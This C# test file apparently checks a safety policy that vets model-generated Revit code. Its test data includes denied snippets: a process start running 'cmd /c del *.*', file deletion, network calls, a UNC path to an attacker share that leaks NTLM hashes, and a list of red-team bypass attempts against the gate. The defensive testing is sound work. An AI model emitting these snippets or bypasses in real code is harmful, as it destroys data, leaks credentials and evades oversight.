#nullable enable
// run_revit_code policy golden tests (W4 Task 1, spec §7.8 and §12 "every
// denied category has a golden test"). Snippets bind against the Nice3point
// Revit reference assemblies; nothing runs.
//
// The denial tests compile with a BROAD reference set (every platform assembly,
// so System.Net, System.IO, threading and reflection types all bind): the
// policy must reject them by itself, not only because the add-in's narrow
// reference set leaves them unbound. Accepts_* use the add-in's own set.

using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;
using BinaVibe.Copilot.Code;
using Xunit;

namespace RevitWebAppSync.Tests
{
    public class CodePolicyTests
    {
        // ---- the named golden tests (plan W4 Task 1) -----------------------------------------

        [Fact]
        public void Rejects_FileIo() =>
            AssertRejected("var text = System.IO.File.ReadAllText(@\"C:\\temp\\a.txt\");\nPrint(text);", "file_io", line: 1);

        [Fact]
        public void Rejects_Network() =>
            AssertRejected("using (var http = new System.Net.Http.HttpClient())\n{\n    Print(http.GetStringAsync(\"https://example.com\").Result);\n}", "network");

        [Fact]
        public void Rejects_Process() =>
            AssertRejected("System.Diagnostics.Process.Start(\"cmd.exe\", \"/c del *.*\");", "process");

        [Fact]
        public void Rejects_Reflection() =>
            AssertRejected("var t = typeof(Wall).Assembly;\nPrint(t.FullName);", "reflection");

        [Fact]
        public void Rejects_Export() =>
            AssertRejected("doc.ExportImage(new ImageExportOptions());", "export");

        [Fact]
        public void Rejects_SaveSync() =>
            AssertRejected("doc.SynchronizeWithCentral(new TransactWithCentralOptions(), new SynchronizeWithCentralOptions());\ndoc.Save();", "save_sync");

        [Fact]
        public void Rejects_ApplicationAccess() =>
            AssertRejected("var app = doc.Application;\nPrint(app.VersionName);", "application_access");

        [Fact]
        public void Rejects_EventHook() =>
            AssertRejected("doc.DocumentClosing += (s, e) => { };", "event_hook");

        [Fact]
        public void Rejects_TransactionConstruction() =>
            AssertRejected("using (var t = new Transaction(doc, \"x\"))\n{\n    t.Start();\n    t.Commit();\n}", "transaction_construction");

        [Fact]
        public void Rejects_TaskDialog() =>
            AssertRejected("TaskDialog.Show(\"Hello\", \"from the model\");", "task_dialog");

        [Fact]
        public void Rejects_MemberDeclarationOutsideBody()
        {
            // Closes Run's body, declares a new method, then reopens a body so the braces balance.
            var a = AssertRejected("}\npublic static void Evil() { System.IO.File.Delete(\"x\"); }\nstatic void Pad()\n{", "declaration_outside_body");
            Assert.Equal(CodeStage.Rejected, a.Stage);
            Assert.Null(a.Compilation); // rejected before anything is compiled
        }

        [Fact]
        public void Accepts_TypicalReadQuery()
        {
            var a = CodeTestSupport.AnalyzeProduction(TypicalReadQuery);
            Assert.True(a.Allowed, CodeTestSupport.Describe(a));
        }

        // ---- every category, including the ones the plan does not name -------------------------

        public static readonly (string Category, string Code)[] Golden =
        {
            ("declaration_outside_body", "class Evil { }"),
            ("declaration_outside_body", "}\npublic static void Evil() { }\nstatic void Pad()\n{"),
            ("unsafe_code", "unsafe { int x = 1; int* p = &x; Print(*p); }"),
            ("unsafe_code", "System.Span<int> s = stackalloc int[4];"),
            ("async_and_lock", "lock (doc) { Print(1); }"),
            ("async_and_lock", "async void F() { await System.Threading.Tasks.Task.Delay(1); }"),
            ("unbounded_control_flow", "top:\nPrint(1);\ngoto top;"),
            ("unbounded_control_flow", "IEnumerable<int> Gen() { while (true) yield return 1; }"),
            ("attributes_and_extern", "[System.Runtime.InteropServices.DllImport(\"user32.dll\")]\nstatic extern int MessageBox(System.IntPtr h, string t, string c, int type);"),
            ("preprocessor", "#pragma warning disable\nPrint(1);"),
            ("host_internals", "__print(\"x\");"),
            ("host_internals", "Snippet.Run(doc, uidoc, view);"),
            ("host_internals", "doc.Dispose();"),
            ("host_internals", "using (doc) { Print(1); }"),
            ("host_internals", "using (var v = view) { Print(v.Name); }"),
            ("system_not_allowed", "IDisposable d = uidoc;\nd.Dispose();"),
            ("system_not_allowed", "object o = doc;\nif (o is IDisposable d) d.Dispose();"),
            ("dynamic", "dynamic d = doc;\nPrint(d.Title);"),
            ("event_hook", "doc.DocumentClosing += (s, e) => { };"),
            ("reflection", "Print(\"x\".GetType().Name);"),
            ("reflection", "Print(typeof(Wall));"),
            ("reflection", "var o = System.Activator.CreateInstance(typeof(string));"),
            ("reflection", "var m = typeof(Wall).GetMethods();"),
            ("file_io", "System.IO.File.WriteAllText(@\"C:\\x.txt\", \"x\");"),
            ("network", "var c = new System.Net.Sockets.TcpClient(\"example.com\", 80);"),
            ("process", "System.Environment.Exit(0);"),
            ("threading", "new System.Threading.Thread(() => { }).Start();"),
            ("threading", "var t = System.Threading.Tasks.Task.Run(() => 1);"),
            ("transaction_construction", "var g = new TransactionGroup(doc);"),
            ("transaction_construction", "var s = new SubTransaction(doc);"),
            ("task_dialog", "var d = new TaskDialog(\"x\");"),
            ("application_access", "uidoc.Application.PostCommand(RevitCommandId.LookupPostableCommandId(PostableCommand.Undo));"),
            ("application_access", "var e = ExternalEvent.Create(null);"),
            ("application_access", "var u = UpdaterRegistry.GetRegisteredUpdaterInfos();"),
            ("export", "doc.Export(@\"C:\\out\", \"a\", new List<ElementId>(), new DWGExportOptions());"),
            ("save_sync", "doc.Close(false);"),
            ("save_sync", "doc.ReloadLatest(new ReloadLatestOptions());"),
            ("save_sync", "var f = doc.EditFamily(null);"),
            ("link_load", "doc.LoadFamily(@\"C:\\f.rfa\");"),
            ("link_load", "RevitLinkType t = null;\nt.Unload(null);"),
            ("link_load", "RevitLinkType t = null;\nt.Reload();"),
            ("ownership", "WorksharingUtils.RelinquishOwnership(doc, new RelinquishOptions(true), new TransactWithCentralOptions());"),
            ("ownership", "WorksharingUtils.CheckoutElements(doc, new List<ElementId>());"),
            ("print", "doc.Print(new ViewSet());"),
            ("print", "var pm = doc.PrintManager;"),
            ("paths", "Print(doc.PathName);"),
            ("paths", "var mp = ModelPathUtils.ConvertUserVisiblePathToModelPath(@\"C:\\a.rvt\");"),
            ("paths", "var o = new ImageTypeOptions(@\"C:\\a.png\", false, ImageTypeSource.Import);"),
            ("ui_interaction", "var r = uidoc.Selection.PickObject(ObjectType.Element);"),
            ("ui_interaction", "uidoc.ActiveView = view;"),
            ("ui_interaction", "var d = new FileOpenDialog(\"*.rvt\");"),
            ("system_not_allowed", "var r = new System.Text.RegularExpressions.Regex(\"a+\");"),
            ("system_not_allowed", "var c = System.Globalization.CultureInfo.CurrentCulture;"),
            ("system_not_allowed", "var u = new System.Uri(\"http://example.com\");"),
            ("assembly_not_allowed", "Print(BinaVibe.Copilot.Code.CodeGate.Hash(\"x\"));"),
            // Fix round 1, C1: work the loop budget cannot count
            ("uncounted_work", "var q = from w in new FilteredElementCollector(doc).OfClass(typeof(Wall)) select w.Name;\nPrint(q.Count());"),
            ("uncounted_work", "var n = Enumerable.Range(0, 10).Select(Math.Abs).Sum();"),
            ("uncounted_work", "Func<double, double> f = Math.Sqrt;\nPrint(f(4));"),
            ("uncounted_work", "IEnumerable<int> e = Enumerable.Range(0, 3);\nPrint(e?.Concat(e).Count());"),
            // Fix round 1, C3: link reload and link-file writes
            ("link_load", "RevitLinkType t = null;\nt.RevertLocalUnloadStatus();"),
            ("link_load", "RevitLinkType t = null;\nt.UnloadLocally(null);"),
            ("save_sync", "RevitLinkType t = null;\nt.SavePositions(null);"),
            ("link_load", "doc.PublishCoordinates(new LinkElementId(new ElementId(1L)));"),
            ("link_load", "var f = FabricationConfiguration.GetFabricationConfiguration(doc);\nf.LoadItemFiles(f.GetAllUsedItemFiles());"),
            ("link_load", "FabricationConfiguration.GetFabricationConfiguration(doc).SetServicesToLoad(new List<int> { 1 });"),
            ("link_load", "FabricationConfiguration.GetFabricationConfiguration(doc).ReloadConfiguration();"),
            // Fix round 1, C2: structural path denial (UNC paths leak the drafter's NTLM hash during the preview)
            ("paths", "var t = PointCloudType.Create(doc, \"rcp\", @\"\\\\attacker\\share\\x.rcp\");"),
            ("paths", "Autodesk.Revit.DB.Analysis.SystemsAnalysisOptions o = null;\no.WeatherFile = @\"\\\\h\\s\\w.epw\";"),
            ("paths", "Autodesk.Revit.DB.Analysis.SystemsAnalysisOptions o = null;\no.OutputFolder = @\"\\\\h\\s\";"),
            ("paths", "Autodesk.Revit.DB.Analysis.ViewSystemsAnalysisReport r = null;\nPrint(r.SystemsAnalysisWorkflowFile);"),
            ("paths", "Autodesk.Revit.DB.Analysis.EnergyDataSettings s = null;\nPrint(s.ReportsFolder);"),
            ("paths", "Autodesk.Revit.DB.Analysis.EnergyDataSettings s = null;\ns.SetReportsFolder(@\"\\\\h\\s\");"),
            ("paths", "DWGExportOptions o = null;\no.HatchPatternsFileName = @\"\\\\h\\s\\p.pat\";"),
            ("paths", "ParameterUtils.WriteSharedParametersToFile(doc, @\"\\\\h\\s\\p.txt\");"),
            ("network", "ParameterUtils.DownloadCompanyName(doc, SpecTypeId.String.Text);"),
            ("network", "var o = ParameterUtils.DownloadParameterOptions(SpecTypeId.String.Text);"),
            ("network", "var l = Autodesk.Revit.DB.ExternalData.ExtendedPropertiesLink.CreateFromCloudDataset(doc, \"urn:x\");"),
            // Fix round 1, I3: state a rollback cannot undo
            ("session_state", "Autodesk.Revit.DB.PointClouds.PointCloudEngineRegistry.UnregisterPointCloudEngine(\"rcp\");"),
            ("session_state", "var s = new SketchEditScope(doc, \"x\");\ns.Start(new ElementId(1L));"),
            ("session_state", "Autodesk.Revit.DB.Visual.AppearanceAssetEditScope s = null;\nPrint(s.IsActive);"),
            ("session_state", "var b = new Autodesk.Revit.DB.ExtensibleStorage.SchemaBuilder(Guid.Empty);\nvar schema = b.Finish();"),
        };

        /// <summary>The engine's safety net for operations it has no rule for: shown on the bound
        /// tree alone, since the syntax pass already bans the constructs that produce them.</summary>
        public static readonly (string Category, string Code)[] GoldenBoundTreeOnly =
        {
            ("unsupported_construct", "int x = 1;\nvar r = __makeref(x);"),
        };

        public static IEnumerable<object[]> GoldenCases() => Golden.Select(g => new object[] { g.Category, g.Code });

        [Theory]
        [MemberData(nameof(GoldenCases))]
        public void Rejects_GoldenCase(string category, string code) => AssertRejected(code, category);

        [Fact]
        public void Rejects_UnsupportedOperation_OnTheBoundTree()
        {
            foreach (var (category, code) in GoldenBoundTreeOnly)
            {
                var wrapped = StatementWrapper.Build(code);
                Assert.NotNull(wrapped.Body);
                var compilation = Microsoft.CodeAnalysis.CSharp.CSharpCompilation.Create("t", new[] { wrapped.Tree },
                    CodeTestSupport.BroadRefs(), CodeGate.CompilationOptions);
                var result = CodePolicy.CheckBoundTree(compilation, wrapped);
                Assert.Contains(result.Violations, v => v.Category == category);
            }
        }

        /// <summary>Bypass attempts found while red-teaming the policy; each must stay rejected.</summary>
        public static IEnumerable<object[]> BypassAttempts() => new[]
        {
            "var t = Type.GetType(\"System.IO.File\");",
            "Func<string, string> f = System.IO.File.ReadAllText;",
            "var x = default(System.IO.FileInfo);",
            "object o = doc;\nvar app = ((Document)o).Application;",
            "var a = doc.GetType().Assembly;",
            "try { } catch (Exception ex) { var m = ex.TargetSite; }",
            "Action a = () => { };\nvar m = a.Method;",
            "Action a = () => { };\na.DynamicInvoke();",
            "Action a = () => { };\na.BeginInvoke(null, null);",
            "System.Linq.Expressions.Expression<Func<int>> e = () => 1;",
            "var q = new List<int>().AsQueryable();",
            "FormattableString s = $\"{1}\";",
            "var arr = new System.IO.FileInfo[0];",
            "var e = Enumerable.Empty<System.Net.IPAddress>();",
            "System.IO.Stream F() => null;",
            "Func<System.IO.Stream, int> f = s => 0;",
            "var w = new FilteredElementCollector(doc).OfClass(typeof(System.IO.File));",
            "GC.Collect();",
            "var d = AppDomain.CurrentDomain;",
            "Console.WriteLine(1);",
            "System.Diagnostics.Debugger.Launch();",
            "var el = doc.GetElement(new ElementId(1L));\nvar app = el.Document.Application;",
            "var dir = Environment.CurrentDirectory;",
            "var ex = new Exception();\nvar data = ex.Data;",
            "var h = new System.Runtime.CompilerServices.ConditionalWeakTable<object, object>();",
            "uidoc.SaveAs();",
            "doc.SaveAs(@\"C:\\x.rvt\");",
            "var v = uidoc.GetOpenUIViews().First();\nv.Close();",
            "var p = doc.GetCloudModelPath();",
            "var r = RevitLinkType.CreateFromIFC(doc, \"a.ifc\", \"b.rvt\", false, new RevitLinkOptions(false));",
            "uidoc.PromptForFamilyInstancePlacement(null);",
            "var x = Enum.GetValues(typeof(BuiltInCategory));",
            "var x = Convert.ChangeType(1, typeof(string));",
            "var x = Array.CreateInstance(typeof(int), 3);",
            "System.Globalization.CultureInfo.CurrentCulture = System.Globalization.CultureInfo.InvariantCulture;",
            "var t = new System.Threading.Timer(_ => { });",
            "var w = new WeakReference(doc);",
            "var s = System.Text.Encoding.UTF8.GetString(new byte[1]);",
            "var ptr = IntPtr.Zero;",
            "string Self() => typeof(int).Name;",
            "Print(nameof(System.IO.File));",
            "var xs = new[] { doc };\nforeach (var x in xs) { using (x) { } }",
            "Func<Document, int> f = dd => { dd.Dispose(); return 0; };",
        }.Select(c => new object[] { c });

        [Theory]
        [MemberData(nameof(BypassAttempts))]
        public void Rejects_KnownBypassAttempts(string code)
        {
            var a = CodeTestSupport.AnalyzeBroad(code);
            Assert.True(a.Stage == CodeStage.Rejected || a.Stage == CodeStage.PolicyRejected, CodeTestSupport.Describe(a));
        }

        [Fact]
        public void Accepts_NameofOfAllowedSymbols()
        {
            var a = CodeTestSupport.AnalyzeProduction("Print(nameof(Wall) + nameof(doc) + nameof(BuiltInCategory.OST_Walls));");
            Assert.True(a.Allowed, CodeTestSupport.Describe(a));
        }

        [Fact]
        public void EveryCategoryHasAGoldenCase()
        {
            var covered = Golden.Select(g => g.Category).Concat(GoldenBoundTreeOnly.Select(g => g.Category)).ToHashSet();
            var missing = CodePolicySet.Default.CategoryIds.Where(c => !covered.Contains(c)).ToList();
            Assert.True(missing.Count == 0, "categories without a golden case: " + string.Join(", ", missing));
            Assert.Empty(covered.Except(CodePolicySet.Default.CategoryIds));
        }

        [Fact]
        public void EngineConstructsAllHaveRules()
        {
            foreach (var (kind, construct) in CodePolicy.EngineConstructs)
                Assert.True(CodePolicySet.Default.HasConstruct(kind, construct), kind + " '" + construct + "' has no rule in code-policy.json");
        }

        [Fact]
        public void Rejection_NamesSymbolAndModelLine()
        {
            var a = CodeTestSupport.AnalyzeBroad("var n = 1;\nPrint(n);\nvar text = System.IO.File.ReadAllText(\"x\");");
            var v = Assert.Single(a.Violations.Where(x => x.Category == "file_io").Take(1));
            Assert.Equal(3, v.Line);
            Assert.Contains("File", v.Symbol);
            Assert.False(string.IsNullOrWhiteSpace(v.Why));
        }

        [Fact]
        public void Accepts_TypeofOnlyAsRevitArgument()
        {
            foreach (var code in new[]
            {
                "var n = new FilteredElementCollector(doc).OfClass(typeof(Wall)).GetElementCount();\nPrint(n);",
                "var f = new ElementClassFilter(typeof(FamilyInstance));\nPrint(f.Inverted);",
            })
            {
                var a = CodeTestSupport.AnalyzeProduction(code);
                Assert.True(a.Allowed, CodeTestSupport.Describe(a));
            }
            AssertRejected("System.Type t = typeof(Wall);", "reflection");
        }

        public static IEnumerable<object[]> CommonRevitCode() => new[]
        {
            // geometry
            "var wall = new FilteredElementCollector(doc).OfClass(typeof(Wall)).FirstElement();\n" +
            "var opt = new Options { ComputeReferences = true, DetailLevel = ViewDetailLevel.Fine };\n" +
            "foreach (var g in wall.get_Geometry(opt))\n" +
            "{\n    if (g is Solid s && s.Volume > 0) Print(s.Volume);\n" +
            "    else if (g is GeometryInstance gi) foreach (var o in gi.GetInstanceGeometry()) Print(o is Solid);\n}",
            // schedules
            "var sched = new FilteredElementCollector(doc).OfClass(typeof(ViewSchedule)).Cast<ViewSchedule>().FirstOrDefault(v => !v.IsTitleblockRevisionSchedule);\n" +
            "var body = sched.GetTableData().GetSectionData(SectionType.Body);\n" +
            "for (int r = 0; r < body.NumberOfRows; r++) Print(sched.GetCellText(SectionType.Body, r, 0));",
            // sheets, views, parameters
            "foreach (ViewSheet sheet in new FilteredElementCollector(doc).OfClass(typeof(ViewSheet)))\n" +
            "    Print(sheet.SheetNumber + \" \" + sheet.Name + \" \" + sheet.GetAllPlacedViews().Count);\n" +
            "var e = doc.GetElement(uidoc.Selection.GetElementIds().FirstOrDefault() ?? ElementId.InvalidElementId);\n" +
            "if (e != null) foreach (Parameter p in e.Parameters) Print(p.Definition.Name + \" = \" + p.AsValueString() + \" \" + p.StorageType + \" \" + p.IsReadOnly);",
            // levels, numbers, culture-free formatting
            "var levels = new FilteredElementCollector(doc).OfClass(typeof(Level)).Cast<Level>().OrderBy(l => l.Elevation).ToList();\n" +
            "foreach (var l in levels) Print(string.Format(System.Globalization.CultureInfo.InvariantCulture, \"{0}: {1:F0} mm\", l.Name, UnitUtils.ConvertFromInternalUnits(l.Elevation, UnitTypeId.Millimeters)));\n" +
            "double.TryParse(\"2,700\", System.Globalization.NumberStyles.Any, System.Globalization.CultureInfo.InvariantCulture, out var d);\n" +
            "var ids = new HashSet<ElementId>(levels.Select(l => l.Id));\nPrint(ids.Contains(ElementId.InvalidElementId) + \" \" + Math.Abs(d) + \" \" + DateTime.Now.Year + \" \" + Convert.ToString(42));\n" +
            "var cat = (BuiltInCategory)levels[0].Category.Id.Value;\nPrint(cat.ToString());\nvar lookup = levels.ToLookup(l => l.Name.Length);\nPrint(lookup.Count);",
            // rooms and boundaries
            "var opts = new SpatialElementBoundaryOptions();\n" +
            "foreach (var room in new FilteredElementCollector(doc).OfCategory(BuiltInCategory.OST_Rooms).OfType<Room>().Where(r => r.Area > 0))\n" +
            "{\n    var segs = room.GetBoundarySegments(opts);\n    Print(room.Number + \" \" + room.Name + \" \" + segs.Sum(loop => loop.Count));\n}",
            // links, worksharing reads, selection and view requests
            "foreach (RevitLinkInstance li in new FilteredElementCollector(doc).OfClass(typeof(RevitLinkInstance)))\n" +
            "{\n    var ld = li.GetLinkDocument();\n    if (ld == null) { Print(li.Name + \" (unloaded)\"); continue; }\n    Print(ld.Title + \" \" + new FilteredElementCollector(ld).WhereElementIsNotElementType().GetElementCount());\n}\n" +
            "var mine = uidoc.Selection.GetElementIds();\n" +
            "if (doc.IsWorkshared) foreach (var id in mine) Print(WorksharingUtils.GetCheckoutStatus(doc, id));\n" +
            "uidoc.Selection.SetElementIds(mine);\nuidoc.ShowElements(mine);\nuidoc.RequestViewChange(view);",
            // collections, tuples, local functions, switch and patterns
            "var counts = new SortedDictionary<string, List<ElementId>>();\n" +
            "string Key(Element el) => el.Category?.Name ?? \"(none)\";\n" +
            "foreach (var el in new FilteredElementCollector(doc, view.Id).WhereElementIsNotElementType())\n" +
            "{\n    if (!counts.TryGetValue(Key(el), out var list)) counts[Key(el)] = list = new List<ElementId>();\n    list.Add(el.Id);\n}\n" +
            "var kinds = counts.Select(kv => (Name: kv.Key, N: kv.Value.Count)).Where(t => t.N > 0).ToList();\n" +
            "foreach (var k in kinds) Print(k.N switch { 1 => k.Name + \": one\", > 100 => k.Name + \": many\", _ => k.Name + \": \" + k.N });\n" +
            "var queue = new Queue<int>(new[] { 3, 1, 2 }); var stack = new Stack<string>(); stack.Push(\"x\"); Print(queue.Peek() + stack.Pop());\n" +
            "var sb = new StringBuilder(); sb.Append('a').Append(1.5).AppendLine(); Print(sb.Length);",
            // using on an object the code created is fine; foreach disposes its own enumerator
            "using (var collector = new FilteredElementCollector(doc).OfCategory(BuiltInCategory.OST_Doors))\n{\n    foreach (var door in collector) Print(door.Name);\n}",
        }.Select(c => new object[] { c });

        [Theory]
        [MemberData(nameof(CommonRevitCode))]
        public void Accepts_CommonRevitCode(string code)
        {
            var a = CodeTestSupport.AnalyzeProduction(code);
            Assert.True(a.Allowed, CodeTestSupport.Describe(a));
        }

        /// <summary>The idioms W8's playbooks rely on (data/copilot/playbooks/*.md in bina-ai): they must
        /// pass the policy, and the model edits among them must be classified as writes.</summary>
        [Fact]
        public void Accepts_PlaybookIdioms()
        {
            var cases = new (string Code, CodeMode Mode)[]
            {
                // LINQ lambdas, anonymous types passed to Print, ?. and pattern matching
                ("var rooms = new FilteredElementCollector(doc).OfCategory(BuiltInCategory.OST_Rooms).WhereElementIsNotElementType().ToElements();\n" +
                 "var rows = rooms.Where(r => r.LookupParameter(\"Area\")?.AsDouble() > 0)\n" +
                 "    .Select(r => new { r.Name, Number = r.LookupParameter(\"Number\")?.AsString(), Level = (doc.GetElement(r.LevelId) as Level)?.Name })\n" +
                 "    .OrderBy(x => x.Level).ThenBy(x => x.Number).ToList();\n" +
                 "foreach (var row in rows) Print(row);\n" +
                 "Print(rows.GroupBy(x => x.Level).Select(g => new { Level = g.Key, Count = g.Count() }));\n" +
                 "foreach (var e in rooms) { if (e is Autodesk.Revit.DB.Architecture.Room { Area: > 0 } room) Print(room.Number); else if (e is SpatialElement s) Print(s.Name); }",
                 CodeMode.Read),
                // Color + OverrideGraphicSettings on a view
                ("var solid = new FilteredElementCollector(doc).OfClass(typeof(FillPatternElement)).Cast<FillPatternElement>().FirstOrDefault(f => f.GetFillPattern().IsSolidFill);\n" +
                 "var ogs = new OverrideGraphicSettings().SetSurfaceForegroundPatternColor(new Color(255, 128, 0));\n" +
                 "if (solid != null) ogs.SetSurfaceForegroundPatternId(solid.Id);\n" +
                 "foreach (var id in new FilteredElementCollector(doc, view.Id).OfCategory(BuiltInCategory.OST_Walls).ToElementIds()) view.SetElementOverrides(id, ogs);",
                 CodeMode.Write),
                // FilledRegionType + FilledRegion
                ("var frt = new FilteredElementCollector(doc).OfClass(typeof(FilledRegionType)).Cast<FilledRegionType>().First();\n" +
                 "var loop = CurveLoop.Create(new List<Curve> { Line.CreateBound(XYZ.Zero, new XYZ(10, 0, 0)), Line.CreateBound(new XYZ(10, 0, 0), new XYZ(10, 5, 0)), Line.CreateBound(new XYZ(10, 5, 0), XYZ.Zero) });\n" +
                 "var region = FilledRegion.Create(doc, frt.Id, view.Id, new List<CurveLoop> { loop });\nPrint(region.Id);",
                 CodeMode.Write),
                // Revision on sheets
                ("var rev = Revision.Create(doc);\nrev.Description = \"Issued for tender\";\nrev.RevisionDate = DateTime.Today.ToString(\"yyyy-MM-dd\");\n" +
                 "foreach (ViewSheet sheet in new FilteredElementCollector(doc).OfClass(typeof(ViewSheet)))\n{\n    var ids = sheet.GetAdditionalRevisionIds();\n    ids.Add(rev.Id);\n    sheet.SetAdditionalRevisionIds(ids);\n}",
                 CodeMode.Write),
                // ElevationMarker interior elevations
                ("var vft = new FilteredElementCollector(doc).OfClass(typeof(ViewFamilyType)).Cast<ViewFamilyType>().First(t => t.ViewFamily == ViewFamily.Elevation);\n" +
                 "var marker = ElevationMarker.CreateElevationMarker(doc, vft.Id, new XYZ(5, 5, 0), 50);\n" +
                 "for (int i = 0; i < 4; i++) { var elev = marker.CreateElevation(doc, view.Id, i); elev.Name = \"Room 101 - \" + \"NESW\"[i]; }",
                 CodeMode.Write),
                // Floor.Create and Ceiling.Create from room boundaries
                ("var room = new FilteredElementCollector(doc).OfCategory(BuiltInCategory.OST_Rooms).OfType<Autodesk.Revit.DB.Architecture.Room>().First(r => r.Area > 0);\n" +
                 "var loops = room.GetBoundarySegments(new SpatialElementBoundaryOptions())\n" +
                 "    .Select(segs => CurveLoop.Create(segs.Select(seg => seg.GetCurve()).ToList())).ToList();\n" +
                 "var floorType = new FilteredElementCollector(doc).OfClass(typeof(FloorType)).FirstElementId();\n" +
                 "var ceilingType = new FilteredElementCollector(doc).OfClass(typeof(CeilingType)).FirstElementId();\n" +
                 "var floor = Floor.Create(doc, loops, floorType, room.LevelId);\n" +
                 "var ceiling = Ceiling.Create(doc, loops, ceilingType, room.LevelId);\n" +
                 "ceiling.get_Parameter(BuiltInParameter.CEILING_HEIGHTABOVELEVEL_PARAM)?.Set(UnitUtils.ConvertToInternalUnits(2700, UnitTypeId.Millimeters));\n" +
                 "Print(new { Floor = floor.Id, Ceiling = ceiling.Id });",
                 CodeMode.Write),
            };
            foreach (var (code, mode) in cases)
            {
                var a = CodeTestSupport.AnalyzeProduction(code);
                Assert.True(a.Allowed, CodeTestSupport.Describe(a) + "\n" + code);
                Assert.True(a.Mode!.Mode == mode, "expected " + mode + " for:\n" + code + "\nreasons: " + string.Join("; ", a.Mode.Reasons));
            }
        }

        [Fact]
        public void Accepts_RequestViewChange()
        {
            // W5's /open-view and vetted navigation commands run on this host: navigation must be allowed.
            var a = CodeTestSupport.AnalyzeProduction(
                "var target = new FilteredElementCollector(doc).OfClass(typeof(ViewSheet)).Cast<ViewSheet>().FirstOrDefault(s => s.SheetNumber == \"A-101\");\n" +
                "if (target != null) uidoc.RequestViewChange(target); else Print(\"no sheet A-101\");");
            Assert.True(a.Allowed, CodeTestSupport.Describe(a));
            AssertRejected("uidoc.ActiveView = view;", "ui_interaction"); // the synchronous setter stays denied
        }

        [Fact]
        public void Accepts_WriteCodeThatThePolicyAllows()
        {
            // Writes are not a policy question (the mode is): these must pass the policy.
            var a = CodeTestSupport.AnalyzeProduction(
                "var wall = new FilteredElementCollector(doc).OfClass(typeof(Wall)).FirstElement();\n" +
                "wall.get_Parameter(BuiltInParameter.ALL_MODEL_INSTANCE_COMMENTS).Set(\"checked\");\n" +
                "ElementTransformUtils.MoveElement(doc, wall.Id, new XYZ(1, 0, 0));\n" +
                "var line = Line.CreateBound(XYZ.Zero, new XYZ(10, 0, 0));\n" +
                "var curve = doc.Create.NewDetailCurve(view, line);\n" +
                "doc.Delete(curve.Id);");
            Assert.True(a.Allowed, CodeTestSupport.Describe(a));
        }

        [Fact]
        public void ProductionReferences_LeaveNetworkUnbound()
        {
            // Defence in depth: with the add-in's own reference set, network types do not even compile.
            var a = CodeTestSupport.AnalyzeProduction("var c = new System.Net.Http.HttpClient();");
            Assert.NotEqual(CodeStage.Allowed, a.Stage);
        }

        [Theory]
        [InlineData("paths", true)]
        [InlineData("itemFiles", true)]
        [InlineData("folderPath", true)]
        [InlineData("url", true)]
        [InlineData("serverUris", true)]
        [InlineData("dirs", true)]
        [InlineData("path", true)]
        [InlineData("filePath", true)]
        [InlineData("fileName", true)]
        [InlineData("strPath", true)]
        [InlineData("folder", true)]
        [InlineData("profile", false)]
        [InlineData("direction", false)]
        [InlineData("filter", false)]
        public void PathParameterNames(string name, bool isPath)
        {
            var tokens = CodePolicySet.Default.Rules.First(r => r.Kind == CodeRuleKinds.PathMember).MatchSet;
            Assert.Equal(isPath, CodePolicy.IsPathName(name, tokens));
        }

        // ---- C2: every path-like Revit member is denied, cannot carry a path, or was reviewed ----

        /// <summary>Path-like members (a name or parameter token is path/file/folder/dir/url/uri, plurals
        /// included) that the policy allows and whose signature still holds something path-shaped (a type
        /// named like a path or file, an interface or a delegate). Each was read and judged harmless.
        /// A trailing * matches any member-name suffix.</summary>
        internal static readonly (string Key, string Why)[] ReviewedPathLike =
        {
            ("Autodesk.Revit.DB.Analysis.PathOfTravel.*", "path-of-travel elements: geometry in a view, no files"),
            ("Autodesk.Revit.DB.Analysis.CriticalPathCollector.GetCriticalPathCollectorIterator", "MEP critical-path analysis, a read"),
            ("Autodesk.Revit.DB.Structure.PathReinforcement.*", "rebar path-reinforcement elements"),
            ("Autodesk.Revit.DB.Structure.RebarHostData.GetPathReinforcementsInHost", "rebar host read"),
            ("Autodesk.Revit.DB.Structure.RebarFreeFormAccessor.GetComputationDataFor3DPathSet", "free-form rebar geometry data"),
            ("Autodesk.Revit.DB.Structure.RebarFreeFormAccessor.SetComputationDataFor3DPathSet", "free-form rebar geometry data (a write, previewed)"),
            ("Autodesk.Revit.DB.FabricationConfiguration.AreItemFilesLoaded", "reads what the fabrication configuration already holds"),
            ("Autodesk.Revit.DB.FabricationConfiguration.GetAllLoadedItemFiles", "reads what the fabrication configuration already holds"),
            ("Autodesk.Revit.DB.FabricationConfiguration.GetAllUsedItemFiles", "reads what the fabrication configuration already holds"),
            ("Autodesk.Revit.DB.FabricationConfiguration.GetItemFolders", "reads what the fabrication configuration already holds"),
            ("Autodesk.Revit.DB.FabricationItemFolder.GetItemFiles", "reads what the fabrication configuration already holds"),
            ("Autodesk.Revit.DB.FabricationItemFolder.GetSubFolders", "reads what the fabrication configuration already holds"),
            ("Autodesk.Revit.DB.FabricationPart.Create", "places a part from an item file the configuration holds: a model write, previewed and approved"),
            ("Autodesk.Revit.DB.BrowserOrganization.GetFolderItems", "project browser folders, a read"),
            ("Autodesk.Revit.DB.ExternalResourceBrowserData.GetSubFoldersData", "unreachable: the only constructor takes a folder path and is denied"),
            ("Autodesk.Revit.DB.Architecture.StairsPathType.StairsPathDirection", "enum value"),
            ("Autodesk.Revit.DB.DefaultDivideSettings.PathMeasurementType", "enum value"),
            ("Autodesk.Revit.DB.DGNExportOptions.FileVersion", "enum value on export options (export itself is denied)"),
            ("Autodesk.Revit.DB.DisplacementPath.PathStyle", "enum value"),
            ("Autodesk.Revit.DB.Electrical.ElectricalSystem.CircuitPathMode", "enum value"),
            ("Autodesk.Revit.DB.ImageExportOptions.HLRandWFViewsFileType", "enum value on export options (export itself is denied)"),
            ("Autodesk.Revit.DB.ImageExportOptions.ShadowViewsFileType", "enum value on export options (export itself is denied)"),
            ("Autodesk.Revit.DB.ImageType.PathType", "enum value (absolute or relative), not the path"),
            ("Autodesk.Revit.DB.RevitLinkType.PathType", "enum value (absolute or relative), not the path"),
            ("Autodesk.Revit.DB.RevitLinkType.GetLinkedFileStatus", "enum value (loaded, unloaded, not found)"),
        };

        [Fact]
        public void PathLikeRevitMembersAreDeniedOrReviewed()
        {
            var compilation = Microsoft.CodeAnalysis.CSharp.CSharpCompilation.Create("scan", null, CodeTestSupport.ProductionRefs(), CodeGate.CompilationOptions);
            var tokens = CodePolicySet.Default.Rules.First(r => r.Kind == CodeRuleKinds.PathMember).MatchSet;
            var unreviewed = new SortedSet<string>(StringComparer.Ordinal);
